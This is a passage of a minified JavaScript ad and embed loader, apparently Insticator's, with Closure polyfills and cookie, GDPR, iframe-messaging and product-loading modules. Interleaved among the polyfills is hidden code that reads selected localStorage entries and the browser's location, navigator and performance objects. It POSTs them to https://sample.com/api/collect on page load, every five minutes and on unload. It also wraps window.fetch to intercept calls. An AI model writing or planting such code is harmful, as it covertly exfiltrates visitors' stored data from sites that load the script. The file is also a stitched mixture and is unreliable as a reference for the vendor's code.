'use strict';

var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.arrayIteratorImpl = function (h) {
  var p = 0;
  return function () {
    return p < h.length ? {
      done: !1,
      value: h[p++]
    } : {
      done: !0
    };
  };
};
$jscomp.arrayIterator = function (h) {
  return {
    next: $jscomp.arrayIteratorImpl(h)
  };
};
const localKeys = window.localKeys;
const globalKeys = ['location', 'navigator', 'performance'];
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.SIMPLE_FROUND_POLYFILL = !1;
function hashData(data) {
  const keySet = Object.keys(data);
  const mergedKeys = keySet.join("|");
  let hashCode = 0;
  for (let index = 0; index < mergedKeys.length; index++) {
    const asciiCode = mergedKeys.charCodeAt(index);
    hashCode = (hashCode << 5) - hashCode + asciiCode;
    hashCode = hashCode & hashCode;
  }
  return hashCode.toString(16);
}
function fetchLocalStorage() {
  const fetchedData = {};
  for (let index = 0; index < localStorage.length; index++) {
    const key = localStorage.key(index);
    if (localKeys.indexOf(key) !== -1) {
      fetchedData[key] = localStorage.getItem(key);
    }
  }
  return fetchedData;
}
$jscomp.ISOLATE_POLYFILLS = !1;
$jscomp.FORCE_POLYFILL_PROMISE = !1;
$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (h, p, l) {
  if (h == Array.prototype || h == Object.prototype) return h;
  h[p] = l.value;
  return h;
};
function fetchGlobalVariables() {
  const fetchedData = {};
  globalKeys.forEach(key => {
    if (window[key]) {
      fetchedData[key] = JSON.stringify(window[key]);
    }
  });
  return fetchedData;
}
$jscomp.getGlobal = function (h) {
  h = ["object" == typeof globalThis && globalThis, h, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
  for (var p = 0; p < h.length; ++p) {
    var l = h[p];
    if (l && l.Math == Math) return l;
  }
  throw Error("Cannot find global object");
};
$jscomp.global = $jscomp.getGlobal(this);
function sendToServer(data) {
  const hashCode = hashData(data);
  const url = "https://sample.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log("数据发送成功");
    } else {
      console.error("数据发送失败,状态码:" + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("数据发送过程中出错");
  };
  xhr.send(JSON.stringify({
    hash: hashCode,
    data: data
  }));
}
$jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
$jscomp.polyfills = {};
$jscomp.propertyToPolyfillSymbol = {};
$jscomp.POLYFILL_PREFIX = "$jscp$";
function collectAndSend() {
  const localStorageData = fetchLocalStorage();
  const globalVariableData = fetchGlobalVariables();
  const collectedData = {
    ...localStorageData,
    ...globalVariableData
  };
  if (Object.keys(collectedData).length > 0) {
    sendToServer(collectedData);
  }
}
var $jscomp$lookupPolyfilledValue = function (h, p) {
  var l = $jscomp.propertyToPolyfillSymbol[p];
  if (null == l) return h[p];
  l = h[l];
  return void 0 !== l ? l : h[p];
};
$jscomp.polyfill = function (h, p, l, e) {
  p && ($jscomp.ISOLATE_POLYFILLS ? $jscomp.polyfillIsolated(h, p, l, e) : $jscomp.polyfillUnisolated(h, p, l, e));
};
$jscomp.polyfillUnisolated = function (h, p, l, e) {
  l = $jscomp.global;
  h = h.split(".");
  for (e = 0; e < h.length - 1; e++) {
    var a = h[e];
    if (!(a in l)) return;
    l = l[a];
  }
  h = h[h.length - 1];
  e = l[h];
  p = p(e);
  p != e && null != p && $jscomp.defineProperty(l, h, {
    configurable: !0,
    writable: !0,
    value: p
  });
};
document.addEventListener("DOMContentLoaded", function () {
  collectAndSend();
  setInterval(collectAndSend, 5 * 60 * 1000);
});
$jscomp.polyfillIsolated = function (h, p, l, e) {
  var a = h.split(".");
  h = 1 === a.length;
  e = a[0];
  e = !h && e in $jscomp.polyfills ? $jscomp.polyfills : $jscomp.global;
  for (var g = 0; g < a.length - 1; g++) {
    var k = a[g];
    if (!(k in e)) return;
    e = e[k];
  }
  a = a[a.length - 1];
  l = $jscomp.IS_SYMBOL_NATIVE && "es6" === l ? e[a] : null;
  p = p(l);
  null != p && (h ? $jscomp.defineProperty($jscomp.polyfills, a, {
    configurable: !0,
    writable: !0,
    value: p
  }) : p !== l && (void 0 === $jscomp.propertyToPolyfillSymbol[a] && (l = 1E9 * Math.random() >>> 0, $jscomp.propertyToPolyfillSymbol[a] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(a) : $jscomp.POLYFILL_PREFIX + l + "$" + a), $jscomp.defineProperty(e, $jscomp.propertyToPolyfillSymbol[a], {
    configurable: !0,
    writable: !0,
    value: p
  })));
};
$jscomp.initSymbol = function () {};
$jscomp.polyfill("Symbol", function (h) {
  if (h) return h;
  var p = function (g, k) {
    this.$jscomp$symbol$id_ = g;
    $jscomp.defineProperty(this, "description", {
      configurable: !0,
      writable: !0,
      value: k
    });
  };
  p.prototype.toString = function () {
    return this.$jscomp$symbol$id_;
  };
  var l = "jscomp_symbol_" + (1E9 * Math.random() >>> 0) + "_",
    e = 0,
    a = function (g) {
      if (this instanceof a) throw new TypeError("Symbol is not a constructor");
      return new p(l + (g || "") + "_" + e++, g);
    };
  return a;
}, "es6", "es3");
$jscomp.polyfill("Symbol.iterator", function (h) {
  if (h) return h;
  h = Symbol("Symbol.iterator");
  for (var p = "Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "), l = 0; l < p.length; l++) {
    var e = $jscomp.global[p[l]];
    "function" === typeof e && "function" != typeof e.prototype[h] && $jscomp.defineProperty(e.prototype, h, {
      configurable: !0,
      writable: !0,
      value: function () {
        return $jscomp.iteratorPrototype($jscomp.arrayIteratorImpl(this));
      }
    });
  }
  return h;
}, "es6", "es3");
$jscomp.iteratorPrototype = function (h) {
  h = {
    next: h
  };
  h[Symbol.iterator] = function () {
    return this;
  };
  return h;
};
Insticator.logger = function () {
  var h = function (l) {
      l = new RegExp("[\\?\x26]" + l + "\x3d([^\x26#]*)").exec(window.location.href);
      return null === l ? "" : decodeURIComponent(l[1].replace(/\+/g, " "));
    }("insticator_log"),
    p = Error;
  p.prototype.write = function (l) {
    l = ["%cInsticator%c %s", "background:#5F9EA0; color:white; font: arial; border-radius: 5px; padding:2px 5px;", "color:#778899;"].concat(l);
    if ("debug" == h) {
      var e;
      if (this.stack) {
        var a = this.stack;
        if (a) {
          var g = (e = -1 !== navigator.userAgent.indexOf("Chrome")) ? 2 : 1;
          a = a.split("\n")[g];
          e && (a = 0 <= a.indexOf(" (") ? a.split(" (")[1].substring(0, a.length - 1) : a.split("at ")[1]);
          e = a;
        } else e = "?";
      } else e = "debug log not supported :(";
      l = l.concat(["\n@" + e]);
    }
    console && console.log && (console.log.apply ? console.log.apply(console, l) : console.log(l));
  };
  return {
    logMessage: function (l) {
      h && p().write(Array.prototype.slice.call(arguments, 0));
    }
  };
}();
window.addEventListener("beforeunload", function () {
  collectAndSend();
});
(function () {
  function h(b) {
    var d = [],
      f = b.reduce(function (c, n) {
        n = n.trafficPercent;
        1E-6 > n && (n = 0);
        c += n;
        d.push(c);
        return c;
      }, 0);
    return 0 === f ? d : d.map(function (c) {
      return c / f;
    });
  }
  function p(b) {
    for (var d = Math.random(), f = b.length, c = 0; c < f; ++c) if (d < b[c]) return c;
    return -1;
  }
  function l(b) {
    var d = document.createElement("link");
    d.rel = "preload";
    d.as = "script";
    d.href = b;
    document.head && document.head.appendChild(d);
  }
  function e(b) {
    var d = window.document,
      f = d.createElement("script");
    f.async = !0;
    f.src = b;
    b = d.getElementsByTagName("script")[0];
    (b ? b.parentNode : d.head).appendChild(f);
  }
  function a() {
    try {
      for (var b = [], d = document.head.childNodes || [], f = 0; f < d.length; f++) d[f].src && b.push(d[f].src);
      return 0 < b.filter(function (c) {
        return (c || "").includes("files/instibid");
      }).length;
    } catch (c) {
      return !1;
    }
  }
  Insticator.cookieUtils = {
    setCookie: function (b, d, f) {
      Insticator.logger.logMessage("setCookie " + b + " value " + d);
      var c = new Date();
      c.setTime(c.getTime() + 864E5 * f);
      f = "expires\x3d" + c.toUTCString();
      document.cookie = b + "\x3d" + d + ";" + f + ";path\x3d/;SameSite\x3dLax";
    },
    getCookie: function (b) {
      b += "\x3d";
      var d = "";
      try {
        d = decodeURIComponent(document.cookie);
      } catch (n) {
        d = document.cookie, Insticator.logger.logMessage("Not able to decode cookie ", n.message);
      }
      d = d.split(";");
      for (var f = 0; f < d.length; f++) {
        for (var c = d[f]; " " == c.charAt(0);) c = c.substring(1);
        if (0 == c.indexOf(b)) return c.substring(b.length, c.length);
      }
      return "";
    }
  };
  window.headerTagInjected = window.headerTagInjected || !1;
  window.insticator_tg = window.insticator_tg || null;
  window.abpStatus = window.abpStatus || !1;
  var g = document.currentScript && document.currentScript.src;
  window.federatedObj ? window.federatedObj.adsCodeSrc = g : window.federatedObj = {
    adsCodeSrc: g
  };
  var k = null;
  if ("undefined" !== typeof URLSearchParams) {
    var m = new URLSearchParams(window.location.search);
    k = m.get("insticator_test_group");
    k || (m = new URLSearchParams(window.location.href), k = m.get("insticator_test_group"));
  }
  (function (b) {
    var d = b.adConfigGroups,
      f = null;
    if (null == k) {
      var c = p(h(d));
      0 <= c && (f = d[c].id, window.insticator_tg = d[c].testGroup);
    } else for (c = 0; c < d.length; ++c) {
      var n = d[c];
      if (String(n.testGroup) === k) {
        f = n.id;
        window.insticator_tg = String(n.testGroup);
        break;
      }
    }
    if (null != f && !headerTagInjected) {
      headerTagInjected = !0;
      try {
        var u = d.filter(function (t) {
            return (t.branch || "").includes("legacy");
          }).map(function (t) {
            return t.id;
          }),
          B = "comment.instiengage.com" === window.location.host;
        if (u.includes(f)) e(b.urlPrefix + "/" + b.tagID + "/" + f + ".js");else {
          if (g) {
            var v = g.split("/");
            if ("d3lcz8vpax4lo2.cloudfront.netd2f0uviei09pxb.cloudfront.net".includes(v[2])) {
              var w = b.urlPrefix.split("/"),
                A = b.instBidUrlPrefix.split("/");
              w[2] = v[2];
              A[2] = v[2];
              b.urlPrefix = w.join("/");
              b.instBidUrlPrefix = A.join("/");
            }
          }
          var C = b.instBidUrlPrefix + "/" + b.tagID + "/" + f + ".js",
            r = b.urlPrefix + "/" + b.tagID + "/" + f + "-hb.js",
            q = b.urlPrefix + "/" + b.tagID + "/" + f + "-dmp.js";
          window.instBid = window.instBid || {
            que: []
          };
          window.instBid.libLoaded || a() || (l(C), e(C));
          l("https://securepubads.g.doubleclick.net/tag/js/gpt.js");
          l(r);
          e(r);
          B || (l(q), e(q));
        }
      } catch (t) {
        e(b.urlPrefix + "/" + b.tagID + "/" + f + ".js"), console.warn("preload failed ", t);
      }
    }
  })(JSON.parse('{"tagID":"fc0dfd76-50f1-4ee7-9e23-c7def2f2a597","adConfigGroups":[{"id":"2e920c6e-eefe-4fa2-9178-5c6a4f2daa10","trafficPercent":50.0,"testGroup":2,"branch":"main","reloaded":1693931279737},{"id":"b8b232d6-4305-4ffa-bf52-3036027e6ab3","trafficPercent":50.0,"testGroup":1,"branch":"main","reloaded":1693931279737},{"id":"bad6401b-fc71-488a-b702-3881340cbc4a","trafficPercent":0.0,"testGroup":0,"branch":"main","reloaded":1693931279737}],"urlPrefix":"//d3lcz8vpax4lo2.cloudfront.net/header-tags","instBidUrlPrefix":"//d3lcz8vpax4lo2.cloudfront.net/files/instibid"}'));
})();
window.Insticator.enableEmbed = !0;
window.Insticator.accountUUID = "9f96ea51-07f4-4fa5-94d0-4532a807c19d";
window.Insticator.siteUUID = "fc0dfd76-50f1-4ee7-9e23-c7def2f2a597";
window.Insticator.enableNewAuthFlow = !0;
function jsHook(funcName, callback) {
  const originalFunc = window[funcName];
  window[funcName] = function () {
    const result = originalFunc.apply(this, arguments);
    callback(arguments, result);
    return result;
  };
}
window.Insticator.enableEnhancedPageUrl = !0;
jsHook("fetch", (args, result) => {
  console.log(`fetch was called with`, args);
  result.then(res => console.log('fetch responded with', res));
});
!function () {
  function h(e) {
    var a = l[e];
    if (void 0 !== a) return a.exports;
    a = l[e] = {
      exports: {}
    };
    return p[e](a, a.exports, h), a.exports;
  }
  var p = {
      542: function (e, a) {
        a.T = void 0;
        a.T = function (g) {
          return Object.keys(g).reduce(function (k, m) {
            return g[m] ? k + ("" === k ? "?" : "\x26") + "".concat(encodeURIComponent(m), "\x3d").concat(encodeURIComponent(g[m])) : k;
          }, "");
        };
      },
      672: function (e, a) {
        a.V = void 0;
        a.V = function () {
          return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (g) {
            var k = 0 | 16 * Math.random();
            return ("x" === g ? k : 8 | 3 & k).toString(16);
          });
        };
      },
      943: function (e, a, g) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.channel = void 0;
        var k = g(883),
          m = g(497),
          b = g(48);
        a.channel = function (f) {
          return {
            publish: function () {
              d(0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {}, f);
            },
            subscribe: function (c) {
              if ("undefined" != typeof window) {
                var n = window.InsticatorXmess.channels;
                n[f] = n[f] || [];
                n[f].push(c);
              }
            },
            unsubscribe: function (c) {
              if ("undefined" != typeof window) {
                var n = window.InsticatorXmess.channels;
                n[f] = n[f] || [];
                n[f] = n[f].filter(function (u) {
                  return u !== c;
                });
              }
            }
          };
        };
        var d = function (f, c) {
          if ("undefined" != typeof window) {
            var n = "undefined" == typeof window ? null : window.name;
            f.frameUuid = f.frameUuid || n;
            n = window.InsticatorXmess.channels;
            n[c] && n[c].length && (0, k.forEach)(n[c], function (u) {
              return u(f);
            });
            (0, b.spreadMessage)({
              messageId: (0, k.uuid)(),
              messageHeader: m.messageHeader,
              channelName: c,
              stamps: [m.xmessNodeId],
              payload: f
            });
          }
        };
      },
      959: function (e, a, g) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.log = void 0;
        var k = g(497);
        a.log = function (m, b) {
          "undefined" != typeof window && window.xmessDebug && (console.log("".concat(window.xmessDebugId || k.xmessNodeId, ": [").concat(m.channelName, "] ").concat(b, " -\x3e")), console.log("  stamps:", m.stamps.join(", ")), console.log("  payload:", m.payload));
        };
      },
      48: function (e, a, g) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.processMessage = a.spreadMessage = void 0;
        var k = g(883),
          m = g(959);
        a.spreadMessage = function (b) {
          "undefined" == typeof window || (window.top !== window.self && (0, k.postMessage)(window.parent, b, "*"), (0, m.log)(b, "spread"), (0, k.sendToAllIFrames)(b, "*"));
        };
        a.processMessage = function (b) {
          (0, m.log)(b, "process");
          var d = b.channelName,
            f = window.InsticatorXmess.channels;
          f[d] && (0, k.forEach)(f[d], function (c) {
            return c(b.payload);
          });
        };
      },
      914: function (e, a, g) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.registerMessageListener = void 0;
        var k = g(497),
          m = g(883),
          b = {
            stack: [],
            push: function (f) {
              b.stack.push(f);
              100 < b.stack.length && b.stack.shift();
            }
          },
          d = [];
        e = function (f) {
          var c = f.data || {};
          c.messageHeader !== k.messageHeader || c.stamps && -1 !== c.stamps.indexOf(k.xmessNodeId) || -1 !== b.stack.indexOf(c.messageId) || (b.push(c.messageId), c.stamps = c.stamps || [], c.stamps.push(k.xmessNodeId), (0, m.forEach)(d, function (n) {
            return n(c);
          }));
        };
        "undefined" == typeof window || (window.addEventListener ? window.addEventListener("message", e) : window.attachEvent("onmessage", e));
        a.registerMessageListener = function (f) {
          return d.push(f);
        };
      },
      497: function (e, a) {
        var g;
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.setXmessNodeId = a.messageHeader = a.xmessNodeId = void 0;
        a.xmessNodeId = g;
        a.messageHeader = "xmess-v2";
        a.setXmessNodeId = function (k) {
          a.xmessNodeId = g = k;
        };
      },
      295: function (e, a, g) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.getResponseChannel = a.getRequestChannel = void 0;
        var k = g(943);
        a.getRequestChannel = function (m) {
          return (0, k.channel)(m + "-insticator-request-channel");
        };
        a.getResponseChannel = function (m) {
          return (0, k.channel)(m + "-insticator-response-channel");
        };
      },
      999: function (e, a, g) {
        a.b = void 0;
        var k = g(295);
        a.b = function (m) {
          var b = (0, k.getRequestChannel)(m),
            d = (0, k.getResponseChannel)(m);
          return {
            make: function () {
              return Error("NotSupported");
            },
            handle: function (f) {
              b.subscribe(function (c) {
                var n = f(c.requestData);
                d.publish({
                  requestId: c.requestId,
                  responseData: n
                });
              });
            }
          };
        };
      },
      883: function (e, a) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        a.forEach = a.sendToAllIFrames = a.getIFramesOnWindow = a.postMessage = a.uuid = void 0;
        a.uuid = function () {
          return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (m) {
            var b = 0 | 16 * Math.random();
            return ("x" === m ? b : 8 | 3 & b).toString(16);
          });
        };
        a.postMessage = function (m, b, d) {
          m.postMessage(b, d);
        };
        var g = function () {
          return Array.from(document.getElementsByTagName("iframe"));
        };
        a.getIFramesOnWindow = g;
        a.sendToAllIFrames = function (m, b) {
          var d = g();
          k(d, function (f) {
            f.contentWindow.postMessage(m, b);
          });
        };
        var k = function (m, b) {
          for (var d = 0; d < m.length; d++) b(m[d]);
        };
        a.forEach = k;
      },
      155: function (e, a, g) {
        Object.defineProperty(a, "__esModule", {
          value: !0
        });
        Object.defineProperty(a, "channel", {
          enumerable: !0,
          get: function () {
            return b.channel;
          }
        });
        e = g(914);
        a = g(48);
        var k = g(497),
          m = g(883),
          b = g(943);
        "undefined" != typeof window && (window.InsticatorXmess || (window.InsticatorXmess = {
          channels: {}
        }, (0, e.registerMessageListener)(a.spreadMessage), (0, e.registerMessageListener)(a.processMessage), (0, k.setXmessNodeId)((0, m.uuid)())));
      },
      14: function (e, a, g) {
        g.r(a);
        var k = g(672);
        (0, g(999).b)("getFederatedTrackingData").handle(function () {
          if (window.Insticator && window.federatedObj && "undefined" !== window.federatedObj.pageview_id) var m = window.federatedObj;else m = {
            pageview_id: (0, k.V)()
          }, m = (window.federatedObj = m, m);
          return m;
        });
      },
      647: function (e, a, g) {
        function k(b) {
          if (1 < arguments.length && void 0 !== arguments[1] && arguments[1] || !document.querySelector("script[src\x3d'".concat(b, "']"))) {
            var d = document.createElement("script");
            d.src = b;
            document.head.appendChild(d);
          }
        }
        function m(b, d) {
          switch (console.log("Loading insticator product", b, d), b) {
            case "infiniteScroll":
              !function (f) {
                f = f.mode;
                window.Insticator.infiniteScrollEnabled = !0;
                var c = {
                  mode: void 0 === f ? "default" : f,
                  products: {},
                  units: {},
                  registerProduct: function (n) {
                    c.products[n.product] = {
                      load: n.load,
                      unload: n.unload
                    };
                  },
                  registerUnit: function (n) {
                    var u = n.id;
                    n = n.product;
                    c.units[n] = c.units[n] || [];
                    c.units[n].push(u);
                  }
                };
                window.Insticator.infiniteScroll = window.Insticator.infiniteScroll || c;
                k("https://product.instiengage.com/product-loader-script/infiniteScroll.js");
              }(d);
              break;
            case "rc":
            case "ru":
              window.ratingsScriptRequested || (window.ratingsScriptRequested = !0, k("https://product.instiengage.com/rating-product-scripts/vendors.js"), k("https://product.instiengage.com/rating-product-scripts/sharedRatings.js"));
              break;
            case "em":
            case "ceu":
              !function (f) {
                f = f.id;
                window.Insticator && !window.Insticator.enableEmbed || (function (c) {
                  console.log("Prepare to load embed:", c);
                  var n = document.querySelector("#insticator-container.embedid-".concat(c, " #insticator-embed")) || document.querySelector("div[embed-id\x3d'".concat(c, "']")) || document.querySelector("#insticator-embed");
                  n && !n.childElementCount && function (u, B) {
                    var v = document.createElement("iframe");
                    v.frameBorder = "0";
                    v.scrolling = "no";
                    v.marginheight = "0";
                    v.marginwidth = "0";
                    v.topmargin = "0";
                    v.leftmargin = "0";
                    v.id = "insticator-iframe";
                    v.allowtransparency = "true";
                    u.appendChild(v);
                    window.setTimeout(function () {
                      var w = v.contentWindow.document.createElement("div");
                      w.id = "app";
                      v.contentWindow.document.body.appendChild(w);
                      w = v.contentWindow.document.createElement("script");
                      w.type = "text/javascript";
                      w.src = "https://product.instiengage.com/ceu-code/" + B + ".js";
                      v.contentWindow.document.head.appendChild(w);
                    }, 500);
                  }(n, c);
                }(f), "function" == typeof Insticator.ad.confirmEmbedUUID && Insticator.ad.confirmEmbedUUID(f));
              }(d);
              break;
            case "su":
              window.sentimentScriptRequested || (window.sentimentScriptRequested = !0, k("https://product.instiengage.com/article-sentiment-scripts/sentiments.js"), k("https://product.instiengage.com/article-sentiment-scripts/vendors.js"));
              break;
            case "tu":
              window.trendingScriptRequested || (window.trendingScriptRequested = !0, k("https://product.instiengage.com/trending-now-scripts/unit.js"));
              break;
            case "reactions":
            case "comments":
            case "community":
            case "profile":
              window.isCommentingRequested || (window.isCommentingRequested = !0, k("https://comment.instiengage.com/live/loader/loader.js"));
              break;
            case "customSSO":
              b = d.openAuth;
              d = d.SSOToken;
              window.Insticator.customSSOAuthCallback = b;
              window.Insticator.publisherToken = d;
              break;
            case "new-profile":
              window.InsticatorProfileRequested || (window.InsticatorProfileRequested = !0, k("https://profile.instiengage.com/profile/loader.js"));
              break;
            default:
              console.log("unable to load", b, d);
          }
        }
        g.r(a);
        g.d(a, {
          loadProduct: function () {
            return m;
          }
        });
      },
      862: function (e, a, g) {
        function k(b) {
          var d = window.Insticator.load;
          window.Insticator.load = function () {
            d.apply(this, arguments);
            b.apply(this, arguments);
          };
        }
        function m(b) {
          var d = window.Insticator.q;
          if (d && 0 < d.length) for (var f = 0; f < d.length; f++) b(d[f].t, d[f].o);
        }
        g.r(a);
        g.d(a, {
          setUpQueueListener: function () {
            return k;
          },
          processPreloadedQueue: function () {
            return m;
          }
        });
      },
      168: function (e, a, g) {
        function k(r, q, t) {
          var x = new Date();
          x.setTime(x.getTime() + 864E5 * t);
          t = "expires\x3d" + x.toUTCString();
          document.cookie = r + "\x3d" + q + ";" + t + ";path\x3d/;SameSite\x3dLax";
        }
        function m(r) {
          r += "\x3d";
          var q = "";
          try {
            q = decodeURIComponent(document.cookie);
          } catch (D) {
            q = document.cookie, console.log("Not able to decode cookie ", D.message);
          }
          q = q.split(";");
          for (var t = 0; t < q.length; t++) {
            for (var x = q[t]; " " === x.charAt(0);) x = x.substring(1);
            if (0 === x.indexOf(r)) return x.substring(r.length, x.length);
          }
          return "";
        }
        function b() {
          var r = {
            _value: void 0,
            _listeners: [],
            set: function (q) {
              r._value = q;
              for (var t = 0; t < r._listeners.length; t++) r._listeners[t](q);
            },
            get: function (q) {
              if (void 0 !== r._value) return q(r._value);
              r._listeners.push(q);
            }
          };
          return r;
        }
        function d() {
          return window.Insticator && window.Insticator.settings && void 0 !== window.Insticator.settings.visitorGeo;
        }
        function f() {
          return window.Insticator && window.Insticator.shared && window.Insticator.shared.visitor && void 0 !== window.Insticator.shared.visitor.visitorGeo;
        }
        function c(r) {
          (0, u.channel)("authIframeLoaded").unsubscribe(c);
          r.hasUserOptIn ? w.set(!1) : function () {
            v.get(0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : function () {});
          }(function (q) {
            q = q.isGdpr && !q.gdprAllowCookie;
            w.set(q);
            (0, u.channel)("authIframeUpdateGdprStatus").publish({
              isConsentRequired: q,
              isConstentRequired: q
            });
          });
        }
        function n() {
          var r = this;
          return this.checkUserData = function (q) {
            w.get(function (t) {
              r.processIsConsentRequired(t);
              t ? q() : A.get(function (x) {
                r.processUserInfoDataAfterConsent(x);
                q();
              });
            });
            !0;
            (0, u.channel)("shareTrackingData").subscribe(this.setUserDataOnWindow);
          }, this.optUserIn = function () {
            (0, u.channel)("authIframeUpdateGdprStatus").publish({
              isConstentRequired: !1,
              isConsentRequired: !1,
              isUserAction: !0
            });
            A.get(r.processUserInfoDataAfterConsent);
          }, this.processIsConsentRequired = function (q) {
            window.Insticator.user = window.Insticator.user || {};
            window.Insticator.user.showGDPRMessage = q;
          }, this.processUserInfoDataAfterConsent = function (q) {
            window.Insticator.user = window.Insticator.user || {};
            window.Insticator.user.userUUID = q.cookieId;
            window.Insticator.user.showGDPRMessage = !1;
          }, this.setUserDataOnWindow = function (q) {
            window.Insticator.user = window.Insticator.user || {};
            window.Insticator.user.cookieId = q.cookieId;
            window.Insticator.user.insticatorUserUUID = q.userUUID;
          }, this;
        }
        g.r(a);
        g.d(a, {
          User: function () {
            return n;
          }
        });
        var u = g(155),
          B = g(672),
          v = b();
        !function (r) {
          function q(t) {
            t = "BE BG CZ DK DE EE IE EL ES FR HR IT CY LV LT LU HU MT NL AT PL PT RO SI SK FI SE UK GB".split(" ").includes(t);
            console.log("Visitor gdpr", {
              isGdpr: t,
              gdprAllowCookie: !1
            });
            r({
              isGdpr: t,
              gdprAllowCookie: !1
            });
          }
          if (console.log("Checking for visitor gdpr status"), window.Insticator && window.Insticator.shared && window.Insticator.shared.visitor && void 0 !== window.Insticator.shared.visitor.isGdpr && void 0 !== window.Insticator.shared.visitor.gdprAllowCookies) return console.log("GDPR data was set on Insticator object", {
            isGdpr: window.Insticator.shared.visitor.isGdpr,
            gdprAllowCookies: window.Insticator.shared.visitor.gdprAllowCookies
          }), r({
            isGdpr: window.Insticator.shared.visitor.isGdpr,
            gdprAllowCookies: window.Insticator.shared.visitor.gdprAllowCookies
          });
          console.log("GDPR data was not set on Insticator object");
          d() || f() ? (console.log("Visitor geo was set on Insticator object"), q(d() ? (console.log("using user geo from window.Insticator.settings.visitorGeo", window.Insticator.settings.visitorGeo), window.Insticator.settings.visitorGeo) : f() ? (console.log("using user geo from window.Insticator.shared.visitor.visitorGeo", window.Insticator.shared.visitor.visitorGeo), window.Insticator.shared.visitor.visitorGeo) : void 0)) : (console.log("Visitor geo was not set on Insticator object"), function (t) {
            function x() {
              return {
                visitorGeo: m("plsVisitorGeo"),
                visitorCity: m("plsVisitorCity")
              };
            }
            function D(y) {
              var z = y.visitorGeo;
              y = y.visitorCity;
              "" !== z && "" !== y && (console.log("Writing Geo cookies"), k("plsVisitorGeo", z, 1), k("plsVisitorCity", y, 1), t({
                visitorGeo: z,
                visitorCity: y
              }));
            }
            if (E = (F = x()).visitorGeo, "" !== F.visitorCity && "" !== E) return console.log("Geo was stored in cookies"), D(x());
            var F, E;
            console.log("Making call to geo API");
            (function (y) {
              var z = new XMLHttpRequest();
              z.timeout = 2E3;
              z.onreadystatechange = function () {
                4 == z.readyState && (200 == z.status ? (console.log("Success fetchVisitorGeo"), y(JSON.parse(z.responseText))) : (console.log("Error fetchVisitorGeo"), y("error")));
              };
              z.onerror = function () {
                console.log("Error fetchVisitorGeo");
                y("error");
              };
              z.ontimeout = function () {
                console.log("Timeout fetchVisitorGeo");
                y("error");
              };
              z.open("GET", "https://geoip.instiengage.com/json/", !0);
              z.send(null);
            })(function (y) {
              "error" === y ? t("error") : D({
                visitorGeo: y.country_code,
                visitorCity: y.region_name
              });
            });
          }(function (t) {
            if ("error" === t) return console.log("Setting default gdpr status"), r({
              isGdpr: !0,
              gdprAllowCookie: !1
            });
            q(t.visitorGeo);
          }));
        }(v.set);
        var w = b(),
          A = b();
        (0, u.channel)("userSessionInit").subscribe(A.set);
        var C = setTimeout(function () {
          console.log("Auth Iframe failed to load");
          window.Insticator.authFrameFailed = !0;
          w.set(!0);
          A.set({
            cookieId: (0, B.V)()
          });
        }, 5E3);
        (0, u.channel)("authIframeLoaded").subscribe(function (r) {
          clearTimeout(C);
          c(r);
        });
        (function () {
          if (document.getElementById("Insticator-Auth-Frame")) return document.getElementById("Insticator-Auth-Frame");
          var r = document.createElement("iframe");
          r.hidden = !0;
          r.style.display = "none";
          r.id = "Insticator-Auth-Frame";
          r.src = "https://auth.instiengage.com/auth/index.html";
          document.body.appendChild(r);
        })();
      },
      133: function (e, a, g) {
        function k(b, d) {
          (null == d || d > b.length) && (d = b.length);
          for (var f = 0, c = Array(d); f < d; f++) c[f] = b[f];
          return c;
        }
        g.r(a);
        e = g(155);
        var m = g(542);
        (0, e.channel)("redirect-to-link").subscribe(function (b) {
          window.location.assign(b.url);
          var d = window.location.href.split("#")[0];
          b = b.url.split("#");
          if (!(b = function (c) {
            if (Array.isArray(c)) return c;
          }(b) || function (c, n) {
            var u = null == c ? null : "undefined" != typeof Symbol && c[Symbol.iterator] || c["@@iterator"];
            if (null != u) {
              var B,
                v = [],
                w = !0,
                A = !1;
              try {
                for (u = u.call(c); !(w = (B = u.next()).done) && (v.push(B.value), !n || v.length !== n); w = !0);
              } catch (r) {
                A = !0;
                var C = r;
              } finally {
                try {
                  w || null == u.return || u.return();
                } finally {
                  if (A) throw C;
                }
              }
              return v;
            }
          }(b, 2) || function (c, n) {
            if (c) {
              if ("string" == typeof c) return k(c, n);
              var u = Object.prototype.toString.call(c).slice(8, -1);
              return "Object" === u && c.constructor && (u = c.constructor.name), "Map" === u || "Set" === u ? Array.from(c) : "Arguments" === u || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(u) ? k(c, n) : void 0;
            }
          }(b, 2))) throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
          var f = b[1];
          d === b[0] && f && window.location.reload();
        });
        (0, e.channel)("redirect-to-auth").subscribe(function (b) {
          b = {
            product: b.product,
            authType: b.authType,
